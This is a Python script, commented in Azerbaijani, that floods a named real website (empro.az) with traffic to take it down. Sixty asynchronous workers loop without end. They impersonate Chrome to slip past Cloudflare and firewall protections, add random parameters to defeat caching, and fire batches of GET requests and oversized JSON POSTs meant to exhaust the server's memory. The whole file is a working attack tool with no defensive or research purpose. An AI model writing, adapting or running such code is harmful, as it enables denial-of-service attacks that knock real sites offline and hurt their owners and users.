import asyncio
from curl_cffi.requests import AsyncSession
import random
import string
import time

# --- MAXIMUM DEVASTATION ---
TARGET_URL = "https://empro.az/"
WORKERS = 60  # curl_cffi çox güclüdür, 60 worker saniyədə minlərlə real Chrome sorğusu deməkdir
BATCH_SIZE = 50 # Hər dalğada 50 'öldürücü' paket

def r_str(n=20):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def overlord_strike(worker_id):
    # impersonate="chrome124" - Bu əmr Cloudflare-in bütün divarlarını daxildən deşir
    async with AsyncSession(impersonate="chrome124", http2=True, verify=False) as session:
        print(f"💀 OVERLORD Worker {worker_id} - CLOUDFLARE BYPASSED!")
        
        while True:
            try:
                # Keşlənməni öldürən və daxili bazanı yoran ağır URL
                url = f"{TARGET_URL}?v={time.time()}&search={r_str(50)}&id={r_str(10)}"
                
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-US,en;q=0.9,az;q=0.8",
                    "Cache-Control": "no-cache",
                    "X-Requested-With": "XMLHttpRequest"
                }

                # HTTP/2 Rapid Reset & Heavy Payload
                tasks = []
                for _ in range(BATCH_SIZE):
                    # Serverin RAM-ını bitirmək üçün ağır JSON POST
                    if _ % 4 == 0:
                        payload = {r_str(5): r_str(1000) for _ in range(10)}
                        tasks.append(session.post(url, headers=headers, json=payload))
                    else:
                        tasks.append(session.get(url, headers=headers))
                
                # Bütün 'brauzer' paketlərini eyni saniyədə hədəfin beyninə çırp!
                await asyncio.gather(*tasks, return_exceptions=True)
                
            except Exception:
                await asyncio.sleep(0.01)

async def main():
    print(f"☢️  OVERLORD SYSTEM INITIALIZED: {TARGET_URL}")
    print("[!] Mimicking Chrome Engine... Breaking Enterprise WAF.")
    
    workers = [overlord_strike(i) for i in range(WORKERS)]
    await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
